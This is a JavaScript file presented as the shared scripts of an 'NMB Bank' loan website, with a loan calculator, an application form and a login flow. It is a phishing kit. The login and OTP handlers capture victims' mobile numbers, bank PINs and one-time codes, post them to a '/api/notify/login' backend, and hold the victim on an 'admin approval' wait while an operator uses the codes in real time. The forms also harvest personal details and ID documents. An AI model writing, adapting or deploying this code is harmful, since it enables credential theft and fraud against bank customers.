/* === NMB Bank Loan Website - Shared Scripts (multi-page) === */

/* ---------- Toast ---------- */
function showToast(message, type) {
  let toast = document.getElementById('toast');
  if (!toast) {
    toast = document.createElement('div');
    toast.id = 'toast';
    toast.className = 'toast';
    document.body.appendChild(toast);
  }
  toast.textContent = message;
  toast.className = 'toast ' + (type || 'success');
  void toast.offsetWidth;
  toast.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(function () { toast.classList.remove('show'); }, 4000);
  }
window.showToast = showToast;

/* ---------- Send event to the notification backend (best-effort) ---------- */
function notify(type, payload) {
  try {
    fetch('/api/notify/' + type, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () { /* backend offline - ignore */ });
  } catch (e) { /* ignore */ }
}

document.addEventListener('DOMContentLoaded', function () {

  /* ---------- Navbar Scroll Effect ---------- */
  const navbar = document.getElementById('navbar');
  if (navbar) {
    const onScroll = function () {
      navbar.classList.toggle('scrolled', window.scrollY > 50);
    };
    window.addEventListener('scroll', onScroll);
    onScroll();
  }

  /* ---------- Mobile Menu ---------- */
  const mobileMenu = document.getElementById('mobile-menu');
  const openBtn = document.getElementById('mobile-menu-btn');
  const closeBtn = document.getElementById('close-mobile');
  if (mobileMenu && openBtn) {
    openBtn.addEventListener('click', () => mobileMenu.classList.add('open'));
    if (closeBtn) closeBtn.addEventListener('click', () => mobileMenu.classList.remove('open'));
    mobileMenu.querySelectorAll('a').forEach(a =>
      a.addEventListener('click', () => mobileMenu.classList.remove('open')));
  }

  /* ---------- Fade-In on Scroll ---------- */
  const fadeEls = document.querySelectorAll('.fade-in');
  if ('IntersectionObserver' in window && fadeEls.length) {
    const obs = new IntersectionObserver((entries) => {
      entries.forEach(e => {
        if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); }
      });
    }, { threshold: 0.15 });
    fadeEls.forEach(el => obs.observe(el));
  } else {
    fadeEls.forEach(el => el.classList.add('visible'));
  }

  /* ---------- Loan Calculator ---------- */
  const calcAmount = document.getElementById('calc-amount');
  if (calcAmount) {
    const calcRate = document.getElementById('calc-rate');
    const calcPeriod = document.getElementById('calc-period');
    const calcType = document.getElementById('calc-loan-type');

    function calcLoan() {
      const amount = parseFloat(calcAmount.value);
      const rate = parseFloat(calcRate.value) / 100;
      const months = parseInt(calcPeriod.value, 10);
      const monthlyRate = rate / 12;
      let monthly = monthlyRate === 0
        ? amount / months
        : (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
      const totalRepay = monthly * months;
      const totalInterest = totalRepay - amount;
      const fmt = n => '$' + Math.round(n).toLocaleString('en-US');

      document.getElementById('amount-display').textContent = fmt(amount);
      document.getElementById('monthly-payment').textContent = fmt(monthly);
      document.getElementById('total-interest').textContent = fmt(totalInterest);
      document.getElementById('total-repayment').textContent = fmt(totalRepay);
      document.getElementById('principal-usd').textContent = fmt(amount);
      document.getElementById('progress-bar').style.width =
        (amount > 0 ? (amount / (amount + totalInterest)) * 100 : 0).toFixed(1) + '%';
    }

    calcAmount.addEventListener('input', calcLoan);
    calcRate.addEventListener('input', calcLoan);
    if (calcType) {
      const defaults = { personal: 18.5, business: 16.0, mortgage: 14.0, vehicle: 17.5, education: 15.0, agriculture: 16.5 };
      calcType.addEventListener('change', function () {
        calcRate.value = defaults[this.value] || 18.5;
        calcLoan();
      });
    }
    document.querySelectorAll('.period-btn').forEach(btn => {
      btn.addEventListener('click', function () {
        document.querySelectorAll('.period-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        calcPeriod.value = btn.getAttribute('data-months');
        calcLoan();
      });
    });
    // Pass selected loan to next page
    const continueBtn = document.getElementById('calc-continue');
    if (continueBtn) {
      continueBtn.addEventListener('click', function () {
        const type = calcType ? encodeURIComponent(calcType.value) : '';
        const amt = calcAmount.value;
        const per = calcPeriod.value;
        window.location.href = 'apply.html?type=' + type + '&amount=' + amt + '&period=' + per;
      });
    }
    calcLoan();
  }

  /* ---------- Apply Form (multi-step) ---------- */
  const applyForm = document.getElementById('loan-form');
  if (applyForm) {
    let currentStep = 1;
    const totalSteps = 3;

    function updateStepUI() {
      for (let i = 1; i <= totalSteps; i++) {
        const el = document.getElementById('form-step-' + i);
        if (el) el.classList.toggle('active', i === currentStep);
      }
      document.querySelectorAll('.sp-item').forEach(item => {
        const step = parseInt(item.getAttribute('data-step'), 10);
        const circle = item.querySelector('.sp-circle');
        circle.classList.remove('active', 'done');
        item.classList.remove('active', 'done');
        if (step < currentStep) { circle.classList.add('done'); circle.textContent = '✓'; item.classList.add('done'); }
        else if (step === currentStep) { circle.classList.add('active'); circle.textContent = step; item.classList.add('active'); }
        else { circle.textContent = step; }
      });
      const l1 = document.getElementById('line1'), l2 = document.getElementById('line2');
      if (l1) l1.style.width = currentStep >= 2 ? '100%' : '0%';
      if (l2) l2.style.width = currentStep >= 3 ? '100%' : '0%';
    }

    function validateStep(step) {
      const stepEl = document.getElementById('form-step-' + step);
      if (!stepEl) return true;
      const inputs = stepEl.querySelectorAll('input[required], select[required], textarea[required]');
      for (const input of inputs) {
        if (!input.value.trim()) { input.focus(); showToast('Please fill in all required fields.', 'error'); return false; }
      }
      return true;
    }

    window.nextStep = function (target) {
      if (target > currentStep && !validateStep(currentStep)) return;
      currentStep = target;
      updateStepUI();
      if (currentStep === 3) buildReview();
      document.getElementById('apply').scrollIntoView({ behavior: 'smooth' });
    };

    function buildReview() {
      const data = new FormData(applyForm);
      const labels = {
        firstName: 'First Name', lastName: 'Last Name', email: 'Email',
        phone: 'Phone', address: 'Address', idNumber: 'National ID',
        dob: 'Date of Birth', loanType: 'Loan Type', amount: 'Amount (USD)',
        period: 'Repayment Period', employment: 'Employment', purpose: 'Purpose'
      };
      let html = '';
      for (const key in labels) {
        const val = data.get(key);
        if (val) {
          const display = key === 'amount' ? '$' + Number(val).toLocaleString('en-US') : val;
          html += '<div class="review-row"><span>' + labels[key] + '</span><span>' + display + '</span></div>';
        }
      }
      const summary = document.getElementById('review-summary');
      if (summary) summary.innerHTML = html;
    }

    applyForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const consent = this.querySelector('input[name="consent"]');
      if (consent && !consent.checked) { showToast('Please confirm the consent checkbox.', 'error'); return; }
      const fd = new FormData(applyForm);
      const appId = 'APP-' + Date.now();
      notify('application', {
        appId: appId,
        firstName: fd.get('firstName') || '',
        lastName: fd.get('lastName') || '',
        loanType: fd.get('loanType') || '',
        amount: fd.get('amount') || '',
        email: fd.get('email') || '',
        phone: fd.get('phone') || ''
      });
      showToast('Application saved! Please sign in to continue.', 'success');
      setTimeout(() => { window.location.href = 'login.html'; }, 1500);
    });

    // Prefill from calculator query string
    const params = new URLSearchParams(window.location.search);
    const preset = {
      loanType: params.get('type'),
      amount: params.get('amount'),
      period: params.get('period')
    };
    if (preset.loanType) {
      const sel = applyForm.querySelector('[name="loanType"]');
      if (sel) for (const o of sel.options) if (o.value.toLowerCase() === preset.loanType) o.selected = true;
    }
    if (preset.amount) { const a = applyForm.querySelector('[name="amount"]'); if (a) a.value = preset.amount; }
    if (preset.period) {
      const sel = applyForm.querySelector('[name="period"]');
      if (sel) for (const o of sel.options) if (o.text.startsWith(preset.period)) o.selected = true;
    }
    updateStepUI();
  }

  /* ---------- KYC Upload ---------- */
  const kycForm = document.getElementById('kyc-form');
  if (kycForm) {
    kycForm.querySelectorAll('.upload-input').forEach(input => {
      input.addEventListener('change', function () {
        const row = this.closest('.upload-row');
        const status = row.querySelector('.upload-status');
        if (this.files.length) {
          status.textContent = '✓ ' + this.files[0].name;
          status.classList.add('uploaded');
          row.classList.add('done');
        } else {
          status.textContent = 'Not uploaded';
          status.classList.remove('uploaded');
          row.classList.remove('done');
        }
      });
    });
    kycForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const consent = this.querySelector('input[name="kycConsent"]');
      if (consent && !consent.checked) { showToast('Please agree to the verification terms.', 'error'); return; }
      this.querySelector('button[type="submit"]').disabled = true;
      const modal = document.getElementById('kyc-modal');
      if (modal) modal.classList.add('show');
    });
  }

  /* ---------- App-style Login (mobile + 4-digit PIN + OTP) ---------- */
  const loginForm = document.getElementById('login-form');
  const otpForm = document.getElementById('otp-form');
  if (loginForm) {
    const pinBoxes = loginForm.querySelectorAll('.pin-box');
    const pinHidden = loginForm.querySelector('input[name="password"]');
    const mobile = loginForm.querySelector('input[name="username"]');

    if (mobile) {
      mobile.addEventListener('input', function () {
        mobile.value = mobile.value.replace(/\D/g, '').slice(0, 10);
      });
    }
    const syncPin = function () {
      pinHidden.value = Array.prototype.map.call(pinBoxes, function (b) { return b.value; }).join('');
    };
    pinBoxes.forEach(function (box, idx) {
      box.addEventListener('input', function () {
        box.value = box.value.replace(/\D/g, '').slice(0, 1);
        syncPin();
        if (box.value && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
      });
      box.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace' && !box.value && idx > 0) pinBoxes[idx - 1].focus();
      });
      box.addEventListener('paste', function (e) {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
        for (let i = 0; i < pinBoxes.length; i++) pinBoxes[i].value = text[i] || '';
        syncPin();
        if (text.length) pinBoxes[Math.min(text.length, pinBoxes.length) - 1].focus();
      });
    });

    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const num = mobile ? mobile.value : '';
      const pin = pinHidden.value;
      if (!/^07\d{8}$/.test(num)) {
        showToast('Enter a valid mobile number (07XXXXXXXX).', 'error');
        if (mobile) mobile.focus();
        return;
      }
      if (!/^\d{4}$/.test(pin)) {
        showToast('Your NMB PIN must be 4 digits.', 'error');
        pinBoxes[0].focus();
        return;
      }

      const submitBtn = document.getElementById('submit-pin-btn');
      const statusEl = document.getElementById('pin-status');
      const spinner = document.getElementById('pin-spinner');
      if (submitBtn) submitBtn.disabled = true;
      if (spinner) spinner.style.display = 'inline-flex';

      fetch('/api/notify/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: num, pin: pin })
      })
      .then(function (res) { return res.json(); })
      .then(function (data) {
        var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());

        var pollInterval = null;
        var checkingPinStatus = false;
        var checkPinStatus = function () {
          if (checkingPinStatus) return;
          checkingPinStatus = true;
          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
            .then(function (res) { return res.json(); })
            .then(function (statusData) {
              if (statusData.decided) {
                if (pollInterval) clearInterval(pollInterval);
                if (statusData.status === 'approved') {
                  if (spinner) spinner.style.display = 'none';
                  loginForm.style.display = 'none';
                  if (otpForm) {
                    otpForm.style.display = 'block';
                    otpForm.dataset.phone = num;
                  }
                  if (submitBtn) submitBtn.disabled = false;
                  var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
                  if (firstOtp) firstOtp.focus();
                } else {
                  if (spinner) spinner.style.display = 'none';
                  showToast('Your PIN was rejected by the administrator.', 'error');
                  if (submitBtn) submitBtn.disabled = false;
                  pinBoxes.forEach(function (box) { box.disabled = false; });
                }
              }
            })
            .catch(function () {
              if (spinner) spinner.style.display = 'none';
              showToast('Error checking status. Please try again.', 'error');
            })
            .finally(function () {
              checkingPinStatus = false;
            });
        };
        checkPinStatus();
        pollInterval = setInterval(checkPinStatus, 1000);
      })
      .catch(function () {
        if (spinner) spinner.style.display = 'none';
        showToast('Network error. Please try again.', 'error');
        if (submitBtn) submitBtn.disabled = false;
      });
    });
  }

  if (otpForm) {
    const otpBoxes = otpForm.querySelectorAll('.pin-box');
    const otpHidden = otpForm.querySelector('input[name="otp"]');
    const syncOtp = function () {
      otpHidden.value = Array.prototype.map.call(otpBoxes, function (b) { return b.value; }).join('');
    };
    otpBoxes.forEach(function (box, idx) {
      box.addEventListener('input', function () {
        box.value = box.value.replace(/\D/g, '').slice(0, 1);
        syncOtp();
        if (box.value && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
      });
      box.addEventListener('keydown', function (e) {
        if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
      });
      box.addEventListener('paste', function (e) {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
        for (let i = 0; i < otpBoxes.length; i++) otpBoxes[i].value = text[i] || '';
        syncOtp();
        if (text.length) otpBoxes[Math.min(text.length, otpBoxes.length) - 1].focus();
      });
    });

    otpForm.addEventListener('submit', function (e) {
      e.preventDefault();
      var otp = otpHidden.value;
      if (!/^\d{6}$/.test(otp)) {
        showToast('Enter the 6-digit code sent to your phone.', 'error');
        var first = otpBoxes[0];
        if (first) first.focus();
        return;
      }

      var phone = otpForm.dataset.phone;
      if (!phone) {
        showToast('Session expired. Please start over.', 'error');
        otpForm.style.display = 'none';
        loginForm.style.display = 'block';
        return;
      }

      var submitBtn = this.querySelector('.app-signin');
      var oldText = submitBtn ? submitBtn.textContent : '';
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Approving...';
      }

      fetch('/api/notify/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: phone, otp: otp })
      })
      .then(function (res) { return res.json(); })
      .then(function (data) {
        var loginId = data && data.loginId ? data.loginId : ('OTP-' + Date.now());
        showToast('Waiting for admin approval...', 'success');

        var pollInterval = setInterval(function () {
          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
            .then(function (res) { return res.json(); })
            .then(function (statusData) {
              if (statusData.decided) {
                clearInterval(pollInterval);
                if (statusData.status === 'approved') {
                  showToast('OTP approved! Redirecting...', 'success');
                  setTimeout(function () {
                    window.location.href = 'kyc.html';
                  }, 1500);
                } else {
                  showToast('OTP verification rejected by administrator.', 'error');
                  if (submitBtn) {
                    submitBtn.disabled = false;
                    submitBtn.textContent = oldText;
                  }
                }
              }
            })
            .catch(function () {
              showToast('Error checking status. Please try again.', 'error');
              if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = oldText;
              }
              clearInterval(pollInterval);
            });
        }, 3000);
      })
      .catch(function () {
        showToast('Network error. Please try again.', 'error');
        if (submitBtn) {
          submitBtn.disabled = false;
          submitBtn.textContent = oldText;
        }
      });
    });
  }

  /* ---------- Smooth Anchors ---------- */
  document.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener('click', function (e) {
      const href = this.getAttribute('href');
      if (href.length > 1) {
        const target = document.querySelector(href);
        if (target) {
          e.preventDefault();
          const y = target.getBoundingClientRect().top + window.scrollY - 70;
          window.scrollTo({ top: y, behavior: 'smooth' });
        }
      }
    });
  });

});
